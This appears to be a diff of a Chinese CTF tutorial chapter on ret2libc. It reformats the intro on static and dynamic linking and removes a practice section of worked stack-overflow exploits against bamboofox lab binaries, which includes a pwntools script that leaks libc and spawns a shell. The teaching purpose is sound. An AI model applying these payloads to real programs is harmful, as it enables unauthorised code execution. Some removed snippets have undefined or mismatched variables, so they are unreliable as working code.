@@ -1,8 +1,8 @@
 # 1.3.4 ret2libc
 
-之前，我们在ROP题中提到静态链接。静态自然对应动态，两者分别是什么东西呢？
-
-我们程序的不同函数之间相互调用，可能通过绝对或者相对地址来定位。比如说，写在同一个源代码文件里的两个C函数，一般相互调用时，比如a函数里call了b函数，最初编译可能就在程序里留一个call b，这里的b只是一个标号，因为可能还不知道b在哪儿。直到其他编译过程都处理完，整个程序的结构、各个函数的长度、位置和相对偏移位置都固定了，最后再在刚才留着函数标号的地方回填函数的地址或者相对偏移。事实上，这就是一种程序的链接过程，也是我们在C语言中学到的程序编译的“预处理-编译-链接”里的最后一步。
+>   之前，我们在ROP题中提到静态链接。静态自然对应动态，两者分别是什么东西呢？
+>   
+>   我们程序的不同函数之间相互调用，可能通过绝对或者相对地址来定位。比如说，写在同一个源代码文件里的两个C函数，一般相互调用时，比如a函数里call了b函数，最初编译可能就在程序里留一个call b，这里的b只是一个标号，因为可能还不知道b在哪儿。直到其他编译过程都处理完，整个程序的结构、各个函数的长度、位置和相对偏移位置都固定了，最后再在刚才留着函数标号的地方回填函数的地址或者相对偏移。事实上，这就是一种程序的链接过程，也是我们在C语言中学到的程序编译的“预处理-编译-链接”里的最后一步。
 
 同样地，如果程序有多个源文件，那么最后也要经过多个编译好的目标文件之间的地址链接来将程序结合起来，使得他们之间可以相互知道各自的位置，用以相互调用。
 
@@ -285,124 +285,4 @@ constraints:
 
 ## 实践
 
-### libc相关
-
-例1.直接调用PLT
-
-来自bamboofox 中 ret2libc1。查看保护：
-
-```shell
-    Arch:     i386-32-little
-    RELRO:    Partial RELRO
-    Stack:    No canary found
-    NX:       NX enabled
-    PIE:      No PIE (0x8048000)
-```
-
-在IDA中反汇编，发现简单的栈溢出：
-
-```c
-int __cdecl main(int argc, const char **argv, const char **envp)
-{
-  int v4; // [sp+1Ch] [bp-64h]@1
-  setvbuf(stdout, 0, 2, 0);
-  setvbuf(_bss_start, 0, 1, 0);
-  puts("RET2LIBC >_<");
-  gets((char *)&v4);
-  return 0;
-}
-```
-
-因此，我们直接修改main的返回地址。返回到哪里呢？我们可以查找发现plt表中有system函数的调用，那么我们可以直接return到那里去。另外，我们还查到程序中含有`'/bin/sh'`字符串。
-
-```shell
-.plt:08048460 ; [00000006 BYTES: COLLAPSED FUNCTION _system. PRESS CTRL-NUMPAD+ TO EXPAND]
-0x08048720 : /bin/sh
-```
-
-这里需要注意的是，我们是通过ret回到system的，没有指定参数。而我们的预想是，执行的效果和call system的效果一样，并且希望函数的第一个参数是字符串地址。程序是32位的，函数参数通过栈压入，因此正常调用call system之后，栈上由高到低依次是：/bin/sh的地址、call压入的返回地址。我们也应该这样伪造，使得main函数ret后和预想中执行了`system("/bin/sh");`的栈布局一样，所以最终的payload为：
-
-```python
-padding=b'#'*0x70
-ret_addr=b'#'*4
-system_plt=0x08048460
-sh_str=0x08048720
-payload=padding+p32(system_addr)+ret_addr+p32(sh_str)
-```
-
-例2.和上面的程序相同，但是不包含/bin/sh，程序中可以找到gets的plt。
-
-于是，我们需要调用两个函数，首先是gets，从键盘读入/bin/sh，然后再执行system。连续调用两个函数并设置参数，需要将栈上的内容清空，具体可以查看我们的构造方法。
-
-```python
-padding=b'#'*0x70
-ret_addr=b'#'*4
-system_plt=0x08048460
-gets_plt = 0x08048460
-bss=0x804a080 #在bss段上随便找一个地址，用来输入我们想要的字符串
-pop_ebx_ret=0x0804843d #ropgadget找到的一个小片段，用来清空栈上残留
-
-payload=padding+p32(gets_plt)+pop_ebx_ret+p32(bss)+p32(system_addr)+ret_addr+p32(bss)
-```
-
-首先，类似于上面的配置，我们返回到了gets，参数为bss段上的一个地址，从键盘输入`/bin/sh`后，gets结束，返回地址为pop_ebx_ret，这时栈顶是gets的参数，我们用了pop使得它出栈，将栈上的参数作了清理，然后执行ret，此时栈顶是system的地址，所以又是类似第一次的配置，完成调用。
-
-例3.同之前的程序，这次在plt表中找不到system了，但是有gets和puts。
-
-既然用不了system的plt地址，那么我们就需要获得它在libc中的真实地址，这里我们就需要泄漏了。
-
-而且，payload肯定需要发送两次，因为第一次的时候我们是不知道libc的真实地址的，所以第一次的发送用来泄漏，第二次才是真实的利用。这里就可能需要ret回main函数来循环调用程序了。同样地，我们需要知道程序用的libc版本，这里就需要用libcdb等工具进行筛选了。
-
-最后，大多数版本的libc中，都是有`'/bin/sh'`字符串的，如果泄漏libc基地址后就可以使用了。
-
-获取libc版本：
-
-```python
-e=ELF('ret2libc3')
-p=process('ret2libc3')
-puts_plt=e.plt['puts']
-gets_got=e.got['gets']
-printf_got=e.got['printf']
-...
-
-padding=b'#'*0x70
-ret_addr=b'#'*4
-
-payload=padding+retaddr+p32(puts_plt)+p32(_______got)#多次运行脚本，最后一项填入gets、printf等已经执行过的函数的got表地址来泄漏，取十六进制最后三位，去libcdb上查询，找到后下载so文件或者符号表。
-p.send(payload)
-```
-
-exp:
-
-```python
-from pwn import *
-e=ELF('ret2libc3')
-libc=ELF('libc.so.6')
-p=process('ret2libc3')
-
-puts_plt=e.plt['puts']
-gets_got=e.got['gets']
-main = e.symbols['main']
-fake_ret_addr=b'#'*4
-
-p.recv()
-payload=b'#'*0x70+p32(puts_plt)+p32(main_addr)+p32(gets_got)
-p.send(payload)
-
-gets_libc=u32(p.recv()[0:4])
-libc_base=gets_libc-libc.symbols['gets']
-print('libc_base='+hex(libc_base))
-system_libc=libc.symbols['system']+libc_base
-sh_str=next(libc.search(b'/bin/sh'))+libc_base
-
-#这里puts执行后，返回地址为main函数，第二次执行main里的gets。这里我们不用管前面的栈布局了，就当成新一次的main函数上的栈溢出漏洞就行
-
-payload=b'#'*0x68+p32(system_libc)+fake_ret_addr+p32(sh_str)#0x68是动态调试得到的填充长度
-p.send(payload)
-p.interactive()
-
-```
-
-
-
-
+### 例题 chp1-3-libcHijack
